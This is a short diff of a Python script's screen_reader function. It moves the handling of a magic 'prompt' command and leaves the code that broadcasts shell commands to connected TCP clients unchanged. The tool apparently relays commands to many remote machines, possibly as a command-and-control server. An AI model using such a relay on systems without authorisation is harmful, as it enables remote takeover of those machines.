@@ -340,6 +340,8 @@ def screen_reader(screen):
                 cmdq_lock.release()
             elif cmd == b'show-serverkey':
                 resp = showcrypto()
+            elif cmd == b'\xc0\xdeprompt':
+                pass
             elif len(cmd) > 0:
                 shcmd = True
                 targets = []
@@ -357,9 +359,6 @@ def screen_reader(screen):
                         resp = '[pk] Can\'t target null command.'
                 blast_command(cmd, screen, targets=targets)
             try:
-                if cmd == b'\xc0\xdeprompt':
-                    screen.sendall(prompt_str())
-                    continue
                 if len(resp) > 0:
                     screen.sendall(bytes('%s\n' % resp, 'utf-8'))
                 if len(tcp_clients) < 1:
